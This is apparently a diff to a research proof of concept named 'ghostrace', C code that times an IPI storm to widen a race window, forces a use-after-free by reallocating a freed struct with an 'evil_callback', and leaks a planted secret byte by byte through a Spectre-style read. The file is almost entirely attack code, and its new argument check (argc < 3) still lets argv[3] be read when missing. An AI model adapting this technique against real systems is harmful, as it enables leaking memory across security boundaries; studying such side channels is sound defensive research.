@@ -24,7 +24,7 @@ char *SECRET = "This is the secret we will leak";
 char buf[L3_CACHE_LINE_SIZE * 255 + 1];
 volatile int ret __cacheline_aligned;
 int freed = 0;
-int go = 0;
+int finished = 0;
 
 int benign_callback()
 {
@@ -55,9 +55,11 @@ void leak_secret(char *secret, int offset)
 }
 
 
-void ipi_delay(struct timespec spec)
+void ipi_delay(unsigned long num_pid)
 {
-    nanosleep(&spec, NULL);
+    //nanosleep(&spec, NULL);
+    for (int i = 0; i < num_pid; i++)
+        getpid();
 }
 
 
@@ -104,9 +106,11 @@ void victim_thread()
     //  Must interrupt exactly between free and mutex unlock for this to work
     pthread_mutex_unlock(&lock);
     clock_t end = clock();
+    for (int  i = 0; i < 10000; i++);
     // free structure here?
     double time = (double)1e3 * (end - start) / CLOCKS_PER_SEC;
     printf("Victim Thread Time: %7.2fms with timer resolution %ld\n", time, timer_length);
+    finished = 1;
     pthread_exit(NULL);
 }
 
@@ -132,18 +136,20 @@ int main(int argc, char **argv)
 
         Arg1 --> timer length
         Arg2 --> lock training epochs
+        Arg3 --> num getpid() to delay ipi storm
 
     */
-    if (argc < 2)
+    if (argc < 3)
     {
-        printf("Expected: ghostrace timer_length\n");
+        printf("Expected: ghostrace timer_length training_epochs num_pid\n");
         exit(0);
     }
     timer_length = atol(argv[1]);
     training_epochs = atol(argv[2]);
+    unsigned long num_pid = atol(argv[3]);
     struct timespec delay;
     delay.tv_sec = 0;
-    delay.tv_nsec = 0;//(spec.it_value.tv_nsec / 200000) * 1;
+    delay.tv_nsec = 100;//(spec.it_value.tv_nsec / 200000) * 1;
 
    // printf("argv[1] : %ld, argv[2] : %ld\n", timer_length, training_epochs);
 
@@ -170,7 +176,7 @@ int main(int argc, char **argv)
     start_victim();
     
 
-    ipi_delay(delay);
+    ipi_delay(num_pid);
 
     begin_ipi_storm();
     //timer_wait(); // we still get delay without waiting
@@ -182,25 +188,27 @@ int main(int argc, char **argv)
         Memory allocation collision
     */
 
-    victim_struct *p = malloc(sizeof(victim_struct));
-    p->callback = evil_callback;
-    assert(p);
     
     if (!freed)
     {
         printf("not freed!\n");
+        timer_cleanup();
         return;
     }
+    victim_struct *p = malloc(sizeof(victim_struct));
+    p->callback = evil_callback;
+    assert(p);
     if (v_st != p)
     {
         printf("UAF failed!\n");
+        timer_cleanup();
         return;
     }
     printf("UAF succeeded.\n");
-
     for (int i = 0; i < strlen(SECRET); i++)
         printf("%c", spectre_read(SECRET, i));
     printf("\n");
+    timer_cleanup();
     //pthread_join(victim, NULL);
    // while(1);
 }
